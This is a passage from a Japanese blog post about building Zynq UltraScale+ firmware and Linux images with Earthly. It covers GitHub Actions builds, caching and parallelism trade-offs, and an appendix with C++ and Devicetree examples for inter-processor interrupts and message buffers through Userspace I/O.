<span id="cb24-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +tf-a/bl31.elf .</span>
<span id="cb24-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-13" aria-hidden="true" tabindex="-1"></a>    <span class="kw">COPY</span> +u-boot/u-boot.elf .</span>
<span id="cb24-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb24-14" aria-hidden="true" tabindex="-1"></a>    SAVE ARTIFACT ./*</span></code></pre></div>
<p>早速このターゲットをビルドします。<code>rootfs-base.tar</code> のために qemu-user-static が準備できていることを再確認した上で次のコマンドを実行します。できたディスクイメージなどはローカルに持ってきたいので <code>--artifact</code> を、<code>--privileged</code> を付けたターゲット <code>disk.img.zst</code> のために <code>--allow-privileged</code> を付けます。</p>
<pre><code>$ earthly --artifact --allow-privileged +build/\* --XSA_FILE=design_1_wrapper.xsa ./build/</code></pre>
<p>あとはこんな感じで <code>disk.img.zst</code> を SD カードに焼けば実機で動かせると思います。</p>
<pre><code>$ zstdcat build/disk.img.zst | sudo dd of=/dev/sdX bs=1M status=progress</code></pre>
<h2 id="github-actions">GitHub Actions</h2>
<p>せっかく Vivado/Vitis を使うことなく (xsct-trim は使っていますが) ビルドできるようになったので、GitHub Actions 上でビルドするようにしてみました。ソフトウェアのパートに絞り、かつ GitHub Actions の設定は最低限のもののみであるとはいえ、あのバージョン管理ツールでさえ導入しにくさに定評のある Xilinx の開発環境を必要とするはずのものが GitHub Actions 上で動いているのは、Earthly 導入の副次効果であるとはいえ大きなことではないかと思います。</p>
<h2 id="今後なんとかしたいこと">今後なんとかしたいこと</h2>
<h3 id="デバッグ関連">デバッグ関連</h3>
<p>なんとかできるといいなと思っていることの1つがデバッグです。Earthly でビルドしたバイナリはデバッグシンボルに含まれるファイルパスがコンテナ内のものなので、ホスト側環境のデバッガー等に食わせるとちゃんと認識してくれません。GDB は <code>set substitute-path</code> でファイルパスの置換ができますが、Xilinx の XSDB はできません。単なるマイコンと違って FPGA の bitstream をロードだとかもできてほしいので、じゃあ GDB だけ使おうってわけにもいかないんです。</p>
<blockquote class="twitter-tweet tw-align-center" data-dnt="true">
<p lang="ja" dir="ltr">
なんか OpenOCD + GDB で Ultra96 の R5 で動いてるアプリのデバッグいけたっぽい <a href="https://t.co/EzRcJhCYyo">pic.twitter.com/EzRcJhCYyo</a>
</p>
— ✧<em>。ヾ(｡ᐳ﹏ᐸ｡)ﾉﾞ。</em>✧ (@myon___) <a href="https://twitter.com/myon___/status/1564703405435928577?ref_src=twsrc%5Etfw">August 30, 2022</a>
</blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<h3 id="ビルドをもっと速くしたい">ビルドをもっと速くしたい</h3>
<p>Earthly は、基本的に同じ入力に対するビルドは1回きりで、それ以降はキャッシュを使ってくれます。言い換えれば、何かしらのターゲットが依存するファイルを少しでも変更すれば、その影響を受けた箇所以降を <code>RUN</code> などのコマンド単位で再実行しなくてはいけません。今回の <code>Earthfile</code> だと、例えば Linux カーネルをビルドする <code>linux</code> ターゲットでそれが顕著に出てくると思います。コンフィグを変更しない限り<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a>リビルドは起きません。しかしコンフィグを1行だけでも書き換えたのなら、前回のビルド結果の再利用もなく <code>RUN make</code> からやり直しです。<code>RUN –-mount=type=cache</code> や <code>CACHE</code> コマンドを使って追加のキャッシュを設定すれば何とかできたりしますが、同時に制御しづらい状態に依存を作ってしまいます。使いどころがちょっと難しいのですよね<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fn6" class="footnote-ref" id="fnref6" role="doc-noteref"><sup>6</sup></a>。</p>
<p>もう一つビルド高速化に関連して、ターゲット内のビルド実行のジョブ数をどーやって決めるか問題があります。Earthly はターゲット間の依存関係に問題ない限り並列に実行してくれます。しかしターゲットのビルドに見込まれる時間やどれくらいの計算リソースが必要かなどはもちろん考慮してくれません。Earthly の並列実行を見込んでタスク内のジョブ数を減らせは (例えば1)、CPU が暇をしまくっているにもかかわらず時間のかかるターゲット1つだけがのんびり実行されることになったり。逆に <code>$(nproc)</code> などにすれば、一時的に CPU やメモリ、時にはディスクアクセスがすごいことになるのが十分に予想できます。今回は手抜きで <code>$(nproc)</code> を設定している箇所がいくつかあります。GitHub Actions でもメモリ不足で殺されることなく動いているようですし、<a href="https://blog.myon.info/entry/2020/09/01/thinkpad-x13/">ThinkPad X13 Gen2</a> の 16GB RAM と約 6 GB のスワップという環境でも、一瞬スワップの使用量がグンと上がる程度でなんとかなっているのでまぁ許容範囲？です。ブラウザのタブをめっちゃ開いていたらいくつかクラッシュしちゃうかもですが。</p>
<h2 id="おわり">おわり</h2>
<p>Earthly という Build automation tool の紹介と、それを Zynq のソフトウェアプロジェクトに導入してみた例を紹介しました。Earthly が個々のソフトウェアのビルド方法自体は大きく変えなくてよく比較的簡単に導入できること、そしてコンテナ内でのビルドで様々な恩恵が得られることが伝わればと思います。Zynq に関しては、イマドキできて当たり前の開発ワークフローでさえ導入しづらく苦労していたものが、Earthly のおかげで随分と開発環境を改善できました。</p>
<h2 id="おまけ-内部実装いろいろ">おまけ: 内部実装いろいろ</h2>
<h3 id="zynq-ultrascale-の-ipi-をそのまま使う">Zynq UltraScale+ の IPI をそのまま使う</h3>
<p>今回の IPI の用途はとても単純なので、この文脈でよく出てくる libmetal や OpenAMP は使っていません。RPU は embeddedsw に含まれる <code>XIpiPsu</code> で、APU 側は Userspace I/O を介して IPI を直接操作しています。</p>
<p>IPI の基本操作 (主要レジスタ) は、割り込みの有効・無効 (<code>IER</code>, <code>IDR</code>)、IPI の Trigger (<code>TRIG</code>)、割り込みを受けたときのステータス確認とクリア (<code>ISR</code>)、割り込みを起こせたか・ターゲットがそれをクリアしたかの確認 (<code>OBS</code>) です。どの操作も、読み書きする値はターゲットの channel に対応するビットマスクです。今回の実装では、RPU 0 をデフォルトの channel 1 に, APU を channel 7 を割り当てました<a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#fn7" class="footnote-ref" id="fnref7" role="doc-noteref"><sup>7</sup></a>。ビットマスクはそれぞれ 8 bit 目と 24 bit 目がこれに対応します。</p>
<p>ということで、まずは embeddedsw の <code>XIpiPsu</code> を使った RPU 側アプリケーションの例です。<code>XIpiPsu</code> は、レジスタの操作ほぼそのままのインターフェイスを提供しているようです。<code>xparameters.h</code> には channel 7 に相当する <code>XPAR_XIPIPS_TARGET_PSU_CORTEXA53_0_CH0_MASK</code> のような定数がないので、コードのなかで定義しています。</p>
<div class="sourceCode" id="cb27"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb27-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="kw">constexpr</span> <span class="bu">std::</span>uint32_t<span class="op"> </span>IPI_TRIG_CH7_MASK <span class="op">=</span> <span class="bu">std::</span>uint32_t<span class="op">{</span><span class="dv">1</span><span class="op">}</span> <span class="op">&lt;&lt;</span> <span class="dv">24</span><span class="op">;</span></span>
<span id="cb27-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb27-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-3" aria-hidden="true" tabindex="-1"></a>XIpiPsu ipi<span class="op">{};</span></span>
<span id="cb27-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-4" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb27-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-5" aria-hidden="true" tabindex="-1"></a>  <span class="kw">auto</span> cfg <span class="op">=</span> XIpiPsu_LookupConfig<span class="op">(</span>XPAR_PSU_IPI_1_DEVICE_ID<span class="op">);</span></span>
<span id="cb27-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-6" aria-hidden="true" tabindex="-1"></a>  XIpiPsu_CfgInitialize<span class="op">(&amp;</span>ipi<span class="op">,</span> cfg<span class="op">,</span> cfg<span class="op">-&gt;</span>BaseAddress<span class="op">);</span></span>
<span id="cb27-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-7" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
<span id="cb27-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb27-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-9" aria-hidden="true" tabindex="-1"></a>XIpiPsu_InterruptEnable<span class="op">(&amp;</span>ipi<span class="op">,</span> IPI_TRIG_CH7_MASK<span class="op">);</span>       <span class="co">// IER</span></span>
<span id="cb27-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-10" aria-hidden="true" tabindex="-1"></a>XIpiPsu_InterruptDisable<span class="op">(&amp;</span>ipi<span class="op">,</span> IPI_TRIG_CH7_MASK<span class="op">);</span>      <span class="co">// IDR</span></span>
<span id="cb27-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-11" aria-hidden="true" tabindex="-1"></a>XIpiPsu_TriggerIpi<span class="op">(&amp;</span>ipi<span class="op">,</span> IPI_TRIG_CH7_MASK<span class="op">);</span>            <span class="co">// TRIG</span></span>
<span id="cb27-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-12" aria-hidden="true" tabindex="-1"></a>XIpiPsu_ClearInterruptStatus<span class="op">(&amp;</span>ipi<span class="op">,</span> IPI_TRIG_CH7_MASK<span class="op">);</span>  <span class="co">// ISR write (clear)</span></span>
<span id="cb27-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb27-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-14" aria-hidden="true" tabindex="-1"></a>XIpiPsu_GetInterruptStatus<span class="op">(</span>ipi<span class="op">);</span>  <span class="co">// ISR read</span></span>
<span id="cb27-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb27-15" aria-hidden="true" tabindex="-1"></a>XIpiPsu_GetObsStatus<span class="op">(&amp;</span>ipi<span class="op">)</span>        <span class="co">// OBS</span></span></code></pre></div>
<p>続いて Linux 側です。IPI のレジスタを UIO で使えるように、カーネルは <code>CONFIG_UIO_PDRV_GENIRQ</code> を有効にしておきます。</p>
<pre><code>Device Drivers  ---&gt;
    &lt;*&gt; Userspace I/O drivers  ---&gt;
        &lt;M&gt;   Userspace I/O platform driver with generic IRQ handling</code></pre>
<p>そして Devicetree に UIO デバイスのノードを追加します。<code>compatible</code> や <code>uio_pdrv_genirq.of_id</code> に設定する文字列は、この界隈の慣習 (?) にならって <code>generic-uio</code> にしています。実際は何でもよいはずです。node-name も名前がかぶらなければ何でもよいと思います。一応 <a href="https://www.devicetree.org/specifications/">Devicetree Specification</a> には Generic Names Recommendation というセクションがありますが、これに当てはまりそうなものはなさそうです。unit-address は対応するもののベースアドレスにしておくのが無難です。</p>
<div class="sourceCode" id="cb29"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb29-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="op">/</span> <span class="op">{</span></span>
<span id="cb29-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb29-2" aria-hidden="true" tabindex="-1"></a>  ipi<span class="op">-</span>ctrl@ff340000 <span class="op">{</span></span>
<span id="cb29-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb29-3" aria-hidden="true" tabindex="-1"></a>    compatible <span class="op">=</span> <span class="st">&quot;generic-uio&quot;</span><span class="op">;</span></span>
<span id="cb29-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb29-4" aria-hidden="true" tabindex="-1"></a>    reg <span class="op">=</span> <span class="op">&lt;</span><span class="bn">0x0</span> <span class="bn">0xff340000</span> <span class="bn">0x0</span> <span class="bn">0x1000</span><span class="op">&gt;;</span></span>
<span id="cb29-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb29-5" aria-hidden="true" tabindex="-1"></a>    interrupt<span class="op">-</span>parent <span class="op">=</span> <span class="op">&lt;&amp;</span>gic<span class="op">&gt;;</span></span>
<span id="cb29-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb29-6" aria-hidden="true" tabindex="-1"></a>    interrupts <span class="op">=</span> <span class="op">&lt;</span><span class="dv">0</span> <span class="dv">29</span> <span class="dv">4</span><span class="op">&gt;;</span></span>
<span id="cb29-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb29-7" aria-hidden="true" tabindex="-1"></a>  <span class="op">};</span></span>
<span id="cb29-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb29-8" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span></code></pre></div>
<p>これで IPI のレジスタなどに <code>/dev/uioN</code> でアクセスできます。実際に操作するコードは例えばこんな感じです。まぁ UIO で見えるようになったレジスタに対して値を読み書きするだけですね。</p>
<div class="sourceCode" id="cb30"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb30-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="kw">constexpr</span> <span class="bu">std::</span>size_t<span class="op"> </span>IPI_TRIG <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> <span class="co">// Interrupt Trigger</span></span>
<span id="cb30-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="kw">constexpr</span> <span class="bu">std::</span>size_t<span class="op"> </span>IPI_OBS <span class="op">=</span> <span class="dv">1</span><span class="op">;</span>  <span class="co">// Interrupt Observation</span></span>
<span id="cb30-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-3" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="kw">constexpr</span> <span class="bu">std::</span>size_t<span class="op"> </span>IPI_ISR <span class="op">=</span> <span class="dv">4</span><span class="op">;</span>  <span class="co">// Interrupt Status and Clear</span></span>
<span id="cb30-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-4" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="kw">constexpr</span> <span class="bu">std::</span>size_t<span class="op"> </span>IPI_IMR <span class="op">=</span> <span class="dv">5</span><span class="op">;</span>  <span class="co">// Interrupt Mask</span></span>
<span id="cb30-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-5" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="kw">constexpr</span> <span class="bu">std::</span>size_t<span class="op"> </span>IPI_IER <span class="op">=</span> <span class="dv">6</span><span class="op">;</span>  <span class="co">// Interrupt Enable</span></span>
<span id="cb30-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-6" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="kw">constexpr</span> <span class="bu">std::</span>size_t<span class="op"> </span>IPI_IDR <span class="op">=</span> <span class="dv">7</span><span class="op">;</span>  <span class="co">// Interrupt Disable</span></span>
<span id="cb30-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-7" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-8" aria-hidden="true" tabindex="-1"></a><span class="kw">inline</span> <span class="kw">constexpr</span> <span class="bu">std::</span>uint32_t<span class="op"> </span>IPI_TRIG_RPU0_MASK <span class="op">=</span> <span class="bu">std::</span>uint32_t<span class="op">{</span><span class="dv">1</span><span class="op">}</span> <span class="op">&lt;&lt;</span> <span class="dv">8</span><span class="op">;</span></span>
<span id="cb30-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-10" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> fd <span class="op">=</span> <span class="op">::</span>open<span class="op">(</span><span class="st">&quot;/dev/uioN&quot;</span><span class="op">,</span> O_RDWR <span class="op">|</span> O_CLOEXEC<span class="op">);</span></span>
<span id="cb30-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-11" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-12" aria-hidden="true" tabindex="-1"></a><span class="kw">auto</span> reg <span class="op">=</span> <span class="kw">static_cast</span><span class="op">&lt;</span><span class="bu">std::</span>uint32_t<span class="op">*&gt;(</span></span>
<span id="cb30-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-13" aria-hidden="true" tabindex="-1"></a>    <span class="op">::</span>mmap<span class="op">(</span><span class="kw">nullptr</span><span class="op">,</span> mapsize<span class="op">,</span> PROT_READ <span class="op">|</span> PROT_WRITE<span class="op">,</span> MAP_SHARED<span class="op">,</span> fd<span class="op">,</span> <span class="dv">0</span><span class="op">));</span></span>
<span id="cb30-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-15" aria-hidden="true" tabindex="-1"></a>reg<span class="op">[</span>IPI_IER<span class="op">]</span> <span class="op">=</span> IPI_TRIG_RPU0_MASK<span class="op">;</span>   <span class="co">// IER</span></span>
<span id="cb30-16"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-16" aria-hidden="true" tabindex="-1"></a>reg<span class="op">[</span>IPI_IDR<span class="op">]</span> <span class="op">=</span> IPI_TRIG_RPU0_MASK<span class="op">;</span>   <span class="co">// IDR</span></span>
<span id="cb30-17"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-17" aria-hidden="true" tabindex="-1"></a>reg<span class="op">[</span>IPI_TRIG<span class="op">]</span> <span class="op">=</span> IPI_TRIG_RPU0_MASK<span class="op">;</span>  <span class="co">// TRIG</span></span>
<span id="cb30-18"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-18" aria-hidden="true" tabindex="-1"></a>reg<span class="op">[</span>IPI_ISR<span class="op">]</span> <span class="op">=</span> IPI_TRIG_RPU0_MASK<span class="op">;</span>   <span class="co">// ISR write (clear)</span></span>
<span id="cb30-19"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-19" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb30-20"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-20" aria-hidden="true" tabindex="-1"></a><span class="at">const</span> <span class="kw">auto</span> isr <span class="op">=</span> reg<span class="op">[</span>IPI_ISR<span class="op">];</span>  <span class="co">// ISR read</span></span>
<span id="cb30-21"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb30-21" aria-hidden="true" tabindex="-1"></a><span class="at">const</span> <span class="kw">auto</span> obs <span class="op">=</span> reg<span class="op">[</span>IPI_OBS<span class="op">];</span>  <span class="co">// OBS</span></span></code></pre></div>
<p>UIO を使った場合の割り込みはちょっとおもしろいです。<code>open</code> したときの file descriptor に1 (non-zero value) を <code>write</code> すると、割り込みが来たタイミングで <code>read</code> が返ってくるというインターフェイスになっています。読み出した値は使っていませんが、カーネルの実装を見た感じでは割り込み毎に増えていくカウンタのようですね。</p>
<div class="sourceCode" id="cb31"><pre class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb31-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> <span class="op">(;;)</span> <span class="op">{</span></span>
<span id="cb31-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-2" aria-hidden="true" tabindex="-1"></a>  <span class="bu">std::</span>uint32_t<span class="op"> </span>irq <span class="op">=</span> <span class="dv">1</span><span class="op">;</span></span>
<span id="cb31-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb31-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-4" aria-hidden="true" tabindex="-1"></a>  <span class="co">// 次の read() で割り込みを受け取る</span></span>
<span id="cb31-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-5" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(::</span>write<span class="op">(</span>fd <span class="op">&amp;</span>irq<span class="op">,</span> <span class="kw">sizeof</span> irq<span class="op">)</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb31-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-6" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>perror<span class="op">(</span><span class="st">&quot;write&quot;</span><span class="op">);</span></span>
<span id="cb31-7"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="op">-</span><span class="dv">1</span><span class="op">;</span></span>
<span id="cb31-8"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-8" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb31-9"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb31-10"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-10" aria-hidden="true" tabindex="-1"></a>  <span class="co">// 割り込みを待つ</span></span>
<span id="cb31-11"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-11" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(::</span>read<span class="op">(</span>fd<span class="op">,</span> <span class="op">&amp;</span>irq<span class="op">,</span> <span class="kw">sizeof</span> irq<span class="op">)</span> <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
<span id="cb31-12"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-12" aria-hidden="true" tabindex="-1"></a>    <span class="bu">std::</span>perror<span class="op">(</span><span class="st">&quot;read&quot;</span><span class="op">);</span></span>
<span id="cb31-13"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="op">-</span><span class="dv">1</span><span class="op">;</span></span>
<span id="cb31-14"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-14" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb31-15"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb31-16"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-16" aria-hidden="true" tabindex="-1"></a>  <span class="co">// 割り込みクリア</span></span>
<span id="cb31-17"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-17" aria-hidden="true" tabindex="-1"></a>  <span class="cf">if</span> <span class="op">(</span>reg<span class="op">[</span>IPI_ISR<span class="op">]</span> <span class="op">&amp;</span> IPI_TRIG_RPU0_MASK<span class="op">)</span> <span class="op">{</span></span>
<span id="cb31-18"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-18" aria-hidden="true" tabindex="-1"></a>    reg<span class="op">[</span>IPI_ISR<span class="op">]</span> <span class="op">=</span> IPI_TRIG_RPU0_MASK<span class="op">;</span></span>
<span id="cb31-19"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-19" aria-hidden="true" tabindex="-1"></a>  <span class="op">}</span></span>
<span id="cb31-20"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb31-20" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>さて、これで互いに IPI を飛ばせるようになりました。では IPI を飛ばしたタイミングで何かしらのデータをやりとりしたい場合はどうするかです。今回は <a href="https://docs.xilinx.com/v/u/en-US/ug1085-zynq-ultrascale-trm">Technical Reference Manual (TRM, UG1085)</a> の IPI と同じ場所で言及されている Message Buffer を使いました。Message Buffer は、IPI の requester/responder の組み合わせ1つあたりに request/response それぞれ 32 byte が確保されたメモリ空間です。IPI を使うプロセッサなど (TRM の言葉だと Agent) は8つあるので、Agent 毎に 0x20 * 2 * 8 = 0x200 byte ですね。</p>
<p>この Message Buffer の厄介なところが、ある IPI の request/response でどこを使えばいいのかがわかりにくいところです。channel と buffer index がとてもまぎらわしいし、おまけに TRM に書いてあるアドレスと <code>xparameters.h</code> の値がなんか違う気がします。今回の構成における値を<code>xparameters.h</code> の値をもとに表にしてみました。環境・構成によっては変わってくるかもしれないことに注意です。</p>
<table>
<thead>
<tr class="header">
<th>Channel Number</th>
<th>Owner</th>
<th>Message Buffer Index</th>
<th>Address</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Channel 0</td>
<td>APU</td>
<td>2</td>
<td><code>0xff99'0400</code></td>
</tr>
<tr class="even">
<td>Channel 1</td>
<td>RPU 0</td>
<td>0</td>
<td><code>0xff99'0000</code></td>
</tr>
<tr class="odd">
<td>Channel 2</td>
<td>RPU 1</td>
<td>1</td>
<td><code>0xff99'0200</code></td>
</tr>
<tr class="even">
<td>Channel 3</td>
<td>PMU</td>
<td>7</td>
<td><code>0xff99'0e00</code></td>
</tr>
<tr class="odd">
<td>Channel 4</td>
<td>PMU</td>
<td>7</td>
<td></td>
</tr>
<tr class="even">
<td>Channel 5</td>
<td>PMU</td>
<td>7</td>
<td></td>
</tr>
<tr class="odd">
<td>Channel 6</td>
<td>PMU</td>
<td>7</td>
<td></td>
</tr>
<tr class="even">
<td>Channel 7</td>
<td>PL 0</td>
<td>3</td>
<td><code>0xff99'0600</code></td>
</tr>
<tr class="odd">
<td>Channel 8</td>
<td>PL 1</td>
<td>4</td>
<td><code>0xff99'0800</code></td>
</tr>
<tr class="even">
<td>Channel 9</td>
<td>PL 2</td>
<td>5</td>
<td><code>0xff99'0a00</code></td>
</tr>
<tr class="odd">
<td>Channel 10</td>
<td>PL 3</td>
<td>6</td>
<td><code>0xff99'0c00</code></td>
</tr>
</tbody>
</table>
<p>0x200 byte の領域の区切られ方も buffer index 順です。ということで RPU 0 (ch 1, idx 0) -&gt; APU (ch 7, idx 3) の IPI では <code>0xff99'00c0</code> と <code>0xff99'00e0</code>、APU -&gt; RPU 0 の IPI では <code>0xff99'0600</code> と <code>0xff99'0620</code> を使えばいいことがわかります。Linux の場合は Devicetree にこんな感じの設定をし、IPI レジスタと同様 <code>mmap</code> した領域を介してアクセスできるようにしました。なお、実際に Message Buffer を使っているのは APU から RPU に IPI するときだけです。</p>
<div class="sourceCode" id="cb32"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb32-1"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="op">/</span> <span class="op">{</span></span>
<span id="cb32-2"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb32-2" aria-hidden="true" tabindex="-1"></a>  ipi<span class="op">-</span>buffer@ff990000 <span class="op">{</span></span>
<span id="cb32-3"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb32-3" aria-hidden="true" tabindex="-1"></a>    compatible <span class="op">=</span> <span class="st">&quot;generic-uio&quot;</span><span class="op">;</span></span>
<span id="cb32-4"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb32-4" aria-hidden="true" tabindex="-1"></a>    reg <span class="op">=</span> <span class="op">&lt;</span><span class="bn">0x0</span> <span class="bn">0xff990600</span> <span class="bn">0x0</span> <span class="bn">0x20</span><span class="op">&gt;,</span> <span class="co">// APU -&gt; RPU0 request</span></span>
<span id="cb32-5"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb32-5" aria-hidden="true" tabindex="-1"></a>          <span class="op">&lt;</span><span class="bn">0x0</span> <span class="bn">0xff990620</span> <span class="bn">0x0</span> <span class="bn">0x20</span><span class="op">&gt;,</span> <span class="co">// RPU0 -&gt; APU response</span></span>
<span id="cb32-6"><a href="https://blog.myon.info/entry/2022/09/19/earthly-zynqmp/#cb32-6" aria-hidden="true" tabindex="-1"></a>          <span class="op">&lt;</span><span class="bn">0x0</span> <span class="bn">0xff9900c0</span> <span class="bn">0x0</span> <span class="bn">0x20</span><span class="op">&gt;,</span> <span class="co">// RPU0 -&gt; APU request</span></span>
